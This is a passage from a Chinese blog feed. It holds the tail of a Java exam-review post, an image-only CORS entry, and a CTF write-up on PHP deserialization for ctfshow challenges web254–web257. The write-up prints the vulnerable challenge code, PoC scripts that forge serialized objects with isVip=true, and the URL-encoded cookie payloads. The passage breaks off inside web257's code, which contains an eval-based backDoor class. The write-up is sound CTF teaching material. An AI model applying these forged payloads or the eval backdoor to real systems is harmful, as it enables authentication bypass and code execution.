class="hljs-comment">// 静态初始化</span><br><span class="hljs-type">int</span>[][] arr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>];    <span class="hljs-comment">// 二维数组</span><br>arr2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">5</span>;                 <span class="hljs-comment">// 访问元素</span><br>System.out.println(arr1.length); <span class="hljs-comment">// 长度属性（非方法！）</span><br></code></pre></td></tr></table></figure><h4 id="2-字符串（高频考点！）"><a href="#2-字符串（高频考点！）" class="headerlink" title="2. 字符串（高频考点！）"></a><strong>2. 字符串</strong>（高频考点！）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;world&quot;</span>);<br><span class="hljs-comment">// 常用方法（对比Python）</span><br>s1.concat(s2);      <span class="hljs-comment">// 拼接（Python: s1+s2）</span><br>s1.substring(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);  <span class="hljs-comment">// 切片&quot;el&quot;（Python: s1[1:3]）</span><br>s1.equals(s2);      <span class="hljs-comment">// 内容比较（==比较地址！）</span><br></code></pre></td></tr></table></figure><h4 id="3-集合类（程序填空）"><a href="#3-集合类（程序填空）" class="headerlink" title="3. 集合类（程序填空）"></a><strong>3. 集合类</strong>（程序填空）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br>ArrayList&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(); <span class="hljs-comment">// 泛型</span><br>list.add(<span class="hljs-string">&quot;A&quot;</span>);                     <span class="hljs-comment">// 添加元素</span><br>list.get(<span class="hljs-number">0</span>);                       <span class="hljs-comment">// 获取元素</span><br>list.size();                       <span class="hljs-comment">// 长度（Python: len()）</span><br><span class="hljs-comment">// Vector线程安全但效率低（用法类似）</span><br></code></pre></td></tr></table></figure><hr><h3 id="第六章-异常处理"><a href="#第六章-异常处理" class="headerlink" title="第六章 异常处理"></a><strong>第六章 异常处理</strong></h3><p>采用try-catch-finally结构：<br>（1）当try语句块中有抛出<br>（throw）异常时，则try语句块中<br>的剩余语句不执行。<br>（2）finally语句块一般都要执<br>行，除非try和catch语句块中有<br>System.exit(0)，则不执行finally语<br>句块，直接退出。<br>（3）当catch语句块能捕捉到<br>try语句块中抛出的异常，则try-<br>catch-finally结构之后的代码会被<br>执行，否则不会被执行。</p><hr><h3 id="第七章-文件与数据流"><a href="#第七章-文件与数据流" class="headerlink" title="第七章 文件与数据流"></a><strong>第七章 文件与数据流</strong></h3><h4 id="1-字节流（程序填空）"><a href="#1-字节流（程序填空）" class="headerlink" title="1. 字节流（程序填空）"></a><strong>1. 字节流</strong>（程序填空）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 文件复制（模板代码！）</span><br><span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;in.jpg&quot;</span>);<br>     <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;out.jpg&quot;</span>)) &#123;<br>    <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-type">int</span> len;<br>    <span class="hljs-keyword">while</span> ((len = fis.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>        fos.write(buffer, <span class="hljs-number">0</span>, len);  <span class="hljs-comment">// 缓冲区读写</span><br>    &#125;<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-缓冲流（效率更高）"><a href="#2-缓冲流（效率更高）" class="headerlink" title="2. 缓冲流（效率更高）"></a><strong>2. 缓冲流</strong>（效率更高）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fis);<br><span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(fos);<br></code></pre></td></tr></table></figure><hr><h3 id="备考策略"><a href="#备考策略" class="headerlink" title="备考策略"></a><strong>备考策略</strong></h3><ol><li><p><strong>优先级排序</strong>：<br><strong>面向对象(30%) &gt; 集合&#x2F;字符串(25%) &gt; 异常&#x2F;流(15%) &gt; 基础语法(30%)</strong></p></li><li><p><strong>Python迁移技巧</strong>：</p><ul><li>Java的<code>ArrayList</code> ≈ Python的<code>list</code></li><li><code>String</code>方法名不同但功能类似（<code>.length()</code> vs <code>len()</code>）</li><li>OOP概念通用（封装、继承、多态）</li></ul></li><li><p><strong>刷题重点</strong>：</p><ul><li>程序填空题：循环&#x2F;数组&#x2F;字符串&#x2F;集合方法调用</li><li>简答题：OOP三大特性、接口vs抽象类</li><li>判断题：标识符规则、异常分类</li></ul></li></ol><blockquote><p>💡 <strong>最后叮嘱</strong>：虽然你精通算法，但Java考试更关注<strong>语法细节</strong>和<strong>API调用规范</strong>，务必多练手写代码！尤其注意分号、花括号、类型声明等Python没有的约束。</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CORS跨域</title>
    <link href="/2025/03/10/CORS%E8%B7%A8%E5%9F%9F/"/>
    <url>/2025/03/10/CORS%E8%B7%A8%E5%9F%9F/</url>
    
    <content type="html"><![CDATA[<p><img src="/../images/image-20250805150643063.png" alt="image-20250805150643063"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF-反序列化</title>
    <link href="/2025/03/08/CTF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/03/08/CTF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<span class="hljs-comment">#定义一个类</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<span class="hljs-comment">#定义一个公开的成员属性username并初始化为xxxxxx</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<span class="hljs-comment">#定义一个公开的成员属性password并初始化为xxxxxx</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<span class="hljs-comment">#定义一个公开的属性isVip并初始化为false，这个属性用来标记用户是否是VIP</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">#定义一个公开的方法checkVip</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<span class="hljs-comment">#返回isVip的值</span><br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<span class="hljs-comment">#定义一个公开的方法login，它接受传递两个参数$u和$p</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>)&#123;<span class="hljs-comment">#使用了全等操作符，判断username和password是否等于$u和$p</span><br>      <span class="hljs-variable language_">$this</span>-&gt;isVip=<span class="hljs-literal">true</span>;<span class="hljs-comment">#如果相等就将isVip的属性值设置为true，即用户是vip</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<span class="hljs-comment">#返回isVip的属性的值</span><br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">#定义一个公开方法vipOneKeyGetFlag</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<span class="hljs-comment">#检查用户是否是vip</span><br>      <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<span class="hljs-comment">#使用global关键字声明$flag变量为全局变量</span><br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<span class="hljs-comment">#输出flag</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-comment">#从URL的GET请求中获取username和password参数的值，并分别赋值给变量$username和$password。</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<span class="hljs-comment">#检查$username和$password变量是否已设置</span><br>  <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<span class="hljs-comment">#实例化对象</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<span class="hljs-comment">#调用ctfShowUse类中login()方法</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<span class="hljs-comment">#检查用户是否是vip</span><br>      <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<span class="hljs-comment">#如果用户是VIP，调用vipOneKeyGetFlag()方法输出flag。</span><br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于这里的user是固定的，所以username和password是一样的</p><p>所以我们只需要把我们传入的用户名和密码等于存储的公开属性的用户名和密码就可以通过验证了</p><p>?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</p><h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <span class="hljs-comment">//序列化部分</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>目标代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>u和p通过get传参，只需保证isvip&#x3D;true即可</p><h4 id="本地生成序列化字符串"><a href="#本地生成序列化字符串" class="headerlink" title="本地生成序列化字符串"></a>本地生成序列化字符串</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span> = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 只设置这个属性</span><br>&#125;<br><br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;原始: &quot;</span> . <span class="hljs-variable">$payload</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;URL编码: &quot;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$payload</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">原始: O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;</span><br><span class="hljs-string">ctfShowUser&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVip&quot;</span>;b:<span class="hljs-number">1</span>;&#125;<br>URL编码: O%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ctfShowUser%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>isVip%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username!==<span class="hljs-variable language_">$this</span>-&gt;password)<br></code></pre></td></tr></table></figure><p>意思是传入的username和password不能一样,无论是值还是类型</p><p><strong><code>!==</code>运算符</strong>：这是PHP中的“全等不等于”运算符。它不仅比较两个值是否不相等，还比较它们的类型是否不同。如果两个值不相等且类型也不同，则表达式的结果为<code>true</code>；否则为<code>false</code>。</p><p>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;ccbbaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;aabbcc&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$user</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码是用于生成一个经过序列化和URL编码的字符串，这个字符串可以被用作攻击payload。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br></code></pre></td></tr></table></figure><h3 id="1-user-new-ctfShowUser"><a href="#1-user-new-ctfShowUser" class="headerlink" title="1. $user = new ctfShowUser();"></a>1. <code>$user = new ctfShowUser();</code></h3><ul><li>这行代码创建了一个<code>ctfShowUser</code>类的新实例（对象）</li><li>这个对象会自动使用类定义中的默认属性值：<ul><li><code>username = &#39;xxxxxx&#39;</code></li><li><code>password = &#39;xxxxxx&#39;</code></li><li><code>isVip = false</code></li></ul></li></ul><h3 id="2-serialize-user"><a href="#2-serialize-user" class="headerlink" title="2. serialize($user)"></a>2. <code>serialize($user)</code></h3><ul><li><code>serialize()</code>函数将PHP对象转换为可存储或传输的字符串表示形式</li><li>对于上面的对象，序列化后的字符串可能类似于：<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;ctfShowUser&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;xxxxxx&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;xxxxxx&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVip&quot;</span>;b:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure>其中：<ul><li><code>O:11:&quot;ctfShowUser&quot;</code> 表示这是一个长度为11的类名”ctfShowUser”的对象</li><li><code>3</code> 表示有3个属性</li><li><code>s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;</code> 表示一个字符串属性，名称长度8(“username”)，值长度6(“xxxxxx”)</li></ul></li></ul><h3 id="3-urlencode-serialize-a"><a href="#3-urlencode-serialize-a" class="headerlink" title="3. urlencode(serialize($a))"></a>3. <code>urlencode(serialize($a))</code></h3><ul><li><code>urlencode()</code>函数对字符串进行URL编码</li><li>这是必要的，因为序列化字符串包含特殊字符（如引号、冒号等），这些字符在URL或Cookie中需要被编码</li><li>编码后的字符串可以安全地作为Cookie值传输</li></ul><h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">info</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">login</span>($<span class="hljs-title">u</span>,$<span class="hljs-title">p</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">info</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span 